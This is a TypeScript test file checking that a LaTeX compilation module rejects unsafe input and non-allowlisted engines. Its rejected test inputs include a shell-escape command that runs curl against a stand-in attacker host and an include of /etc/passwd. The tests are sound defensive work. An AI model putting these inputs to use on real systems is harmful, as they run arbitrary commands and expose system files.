import assert from "node:assert/strict";
import test from "node:test";
import { compileLatex, validateTexSource } from "../../src/documents.js";

test("LaTeX validation rejects shell escape and external file inclusion", () => {
  assert.equal(validateTexSource("\\documentclass{article}\\begin{document}Safe\\end{document}"), true);
  assert.throws(() => validateTexSource("\\write18{curl evil.example}"), /unsafe LaTeX/);
  assert.throws(() => validateTexSource("\\input{/etc/passwd}"), /unsafe LaTeX/);
});

test("compiler accepts only allowlisted engines and passes fixed arguments", async () => {
  const calls: string[][] = [];
  const runner = async (command: string, args: string[]) => {
    calls.push([command, ...args]);
    return { stdout: "ok", stderr: "" };
  };
  const result = await compileLatex("/workspace/.pi-job-search/applications/acme/cv.tex", { cwd: "/workspace", runner });
  assert.equal(result.command, "pdflatex");
  assert.equal(calls[0][1], "-interaction=nonstopmode");
  await assert.rejects(() => compileLatex("/workspace/.pi-job-search/applications/acme/cv.tex", { cwd: "/workspace", engine: "sh" as "pdflatex", runner }), /unsupported LaTeX engine/);
});
